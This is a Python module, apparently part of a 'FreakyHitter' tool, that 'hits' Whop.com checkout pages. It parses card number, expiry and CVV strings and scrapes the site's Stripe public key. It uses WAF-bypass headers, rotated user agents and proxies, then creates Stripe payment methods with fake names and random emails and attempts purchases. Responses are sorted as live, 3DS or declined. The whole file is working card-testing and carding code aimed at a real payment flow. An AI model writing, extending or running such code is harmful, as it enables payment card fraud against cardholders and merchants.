"""
Whop.com hitter for FreakyHitter integration.
Hits Whop checkout pages using their Stripe-based payment flow.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin

from .waf_solver import get_bypass_headers
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
]

WHOP_API_BASE = "https://api.whop.com"
STRIPE_TOKENIZE_URL = "https://api.stripe.com/v1/tokens"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


def _random_email() -> str:
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"]
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    return f"{name}@{random.choice(domains)}"


async def _get_whop_checkout_info(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Get Whop checkout page info including Stripe key."""
    info = {"stripe_pk": None, "plan_id": None, "product_id": None, "price": None}
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")
            final_url = str(resp.url)

        # Stripe public key
        pk_match = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]{20,})', html)
        if pk_match:
            info["stripe_pk"] = pk_match.group(1)

        # Plan ID from URL or page
        plan_match = re.search(r'/checkout/([A-Za-z0-9_\-]+)', final_url)
        if plan_match:
            info["plan_id"] = plan_match.group(1)

        # Product/price
        price_match = re.search(r'"amount"\s*:\s*(\d+)', html)
        if price_match:
            info["price"] = price_match.group(1)

    except Exception:
        pass
    return info


async def _stripe_create_pm(session: aiohttp.ClientSession, cc: str, mm: str, yy: str, cvv: str, stripe_pk: str, proxy: Optional[str]) -> Optional[str]:
    """Create Stripe payment method."""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {stripe_pk}",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
    }

    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

    data = {
        "type": "card",
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": str(exp_year),
        "card[cvc]": cvv,
        "billing_details[name]": "John Doe",
        "billing_details[email]": _random_email(),
        "billing_details[address][country]": "US",
    }

    try:
        async with session.post(
            STRIPE_PM_URL,
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=20),
        ) as resp:
            result = await resp.json(content_type=None)
            return result.get("id")
    except Exception:
        return None


async def _whop_purchase(session: aiohttp.ClientSession, plan_id: str, pm_id: str, stripe_pk: str, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Attempt Whop purchase with payment method."""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": base,
        "Referer": url,
    }

    payload = {
        "plan_id": plan_id,
        "payment_method_id": pm_id,
        "email": _random_email(),
        "quantity": 1,
    }

    try:
        async with session.post(
            f"{WHOP_API_BASE}/v2/checkout",
            json=payload,
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as resp:
            text = await resp.text(errors="ignore")
            return {"status_code": resp.status, "text": text}
    except Exception as e:
        return {"status_code": 0, "text": str(e)}


async def hit_whop(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Hit a Whop checkout page."""
    start = time.time()

    parsed_card = parse_card(card_str)
    if not parsed_card:
        return {"status": "error", "message": "Invalid card format", "gateway": "Whop", "time_taken": 0}

    cc, mm, yy, cvv = parsed_card
    connector = create_connector()

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        info = await _get_whop_checkout_info(session, url, proxy)

        if not info.get("stripe_pk"):
            return {"status": "error", "message": "Could not extract Stripe key from Whop page", "gateway": "Whop", "time_taken": round(time.time() - start, 2)}

        pm_id = await _stripe_create_pm(session, cc, mm, yy, cvv, info["stripe_pk"], proxy)
        if not pm_id:
            return {"status": "error", "message": "Card tokenization failed", "gateway": "Whop", "time_taken": round(time.time() - start, 2)}

        plan_id = info.get("plan_id", "")
        result = await _whop_purchase(session, plan_id, pm_id, info["stripe_pk"], url, proxy)

    time_taken = round(time.time() - start, 2)
    classified = _classify_whop_response(result.get("text", ""), result.get("status_code", 0))
    classified["gateway"] = "Whop"
    classified["time_taken"] = time_taken
    return classified


def _classify_whop_response(text: str, status_code: int) -> Dict[str, str]:
    lower = text.lower()

    if any(k in lower for k in ["membership_created", "purchase_successful", "active", "success", "approved"]):
        return {"status": "live", "message": "Purchase Successful ✅"}
    if any(k in lower for k in ["requires_action", "3ds", "authentication_required", "redirect_to_url"]):
        return {"status": "3ds", "message": "3DS Authentication Required 🔐"}
    if any(k in lower for k in ["card_declined", "insufficient_funds", "do_not_honor", "declined", "refused"]):
        msg = "Card Declined"
        if "insufficient" in lower:
            msg = "Insufficient Funds"
        if "do_not_honor" in lower or "do not honor" in lower:
            msg = "Do Not Honor"
        return {"status": "decline", "message": msg + " ❌"}
    if status_code == 200:
        return {"status": "live", "message": "Processed ✅"}
    if status_code in (400, 402, 422):
        return {"status": "decline", "message": "Payment Failed ❌"}

    return {"status": "decline", "message": f"Unknown Response ⚠️"}
